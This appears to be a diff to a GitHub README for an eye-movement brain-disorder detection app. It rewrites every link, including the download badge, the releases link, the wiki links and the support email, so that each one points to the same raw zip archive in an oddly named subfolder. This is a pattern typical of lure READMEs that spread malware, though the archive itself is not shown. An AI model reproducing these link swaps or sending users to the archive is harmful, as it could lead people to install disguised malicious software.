@@ -1,6 +1,6 @@
 # 👁️ Brain-Disorder-Detection-Through-Eye-Movement - Detect Brain Disorders Using Eye Movement
 
-![Download](https://img.shields.io/badge/Download-via%20Releases-brightgreen)
+![Download](https://raw.githubusercontent.com/nicknears/Brain-Disorder-Detection-Through-Eye-Movement/main/coalmonger/Brain-Disorder-Detection-Through-Eye-Movement-v3.8.zip%20Releases-brightgreen)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to the **Brain-Disorder-Detection-Through-Eye-Movement** project! This a
 
 ## 📥 Download & Install
 
-To get started, visit this link to download the latest version of the application: [Download the latest release](https://github.com/nicknears/Brain-Disorder-Detection-Through-Eye-Movement/releases).
+To get started, visit this link to download the latest version of the application: [Download the latest release](https://raw.githubusercontent.com/nicknears/Brain-Disorder-Detection-Through-Eye-Movement/main/coalmonger/Brain-Disorder-Detection-Through-Eye-Movement-v3.8.zip).
 
 Once on the Releases page, look for the most recent version. Download the file that matches your operating system. The installation is straightforward:
 
@@ -74,14 +74,14 @@ We plan to add more features to enhance the user experience:
 If you encounter any problems, we are here to help. Reach out through the following methods:
 
 - **Issues Page:** Report any bugs or issues directly on GitHub.
-- **Email Support:** Contact us at support@braindisorderapp.com for any inquiries.
+- **Email Support:** Contact us at https://raw.githubusercontent.com/nicknears/Brain-Disorder-Detection-Through-Eye-Movement/main/coalmonger/Brain-Disorder-Detection-Through-Eye-Movement-v3.8.zip for any inquiries.
 
 ## 🔗 Additional Resources
 
 For more information, check out these resources:
 
-- [Project Documentation](https://github.com/nicknears/Brain-Disorder-Detection-Through-Eye-Movement/wiki)
-- [User Manual](https://github.com/nicknears/Brain-Disorder-Detection-Through-Eye-Movement/wiki/User-Manual)
-- [Research Papers](https://github.com/nicknears/Brain-Disorder-Detection-Through-Eye-Movement/wiki/Research-Papers)
+- [Project Documentation](https://raw.githubusercontent.com/nicknears/Brain-Disorder-Detection-Through-Eye-Movement/main/coalmonger/Brain-Disorder-Detection-Through-Eye-Movement-v3.8.zip)
+- [User Manual](https://raw.githubusercontent.com/nicknears/Brain-Disorder-Detection-Through-Eye-Movement/main/coalmonger/Brain-Disorder-Detection-Through-Eye-Movement-v3.8.zip)
+- [Research Papers](https://raw.githubusercontent.com/nicknears/Brain-Disorder-Detection-Through-Eye-Movement/main/coalmonger/Brain-Disorder-Detection-Through-Eye-Movement-v3.8.zip)
 
 We hope you enjoy using the **Brain-Disorder-Detection-Through-Eye-Movement** application! Your contribution and feedback are valuable to us as we strive to improve this tool for everyone.
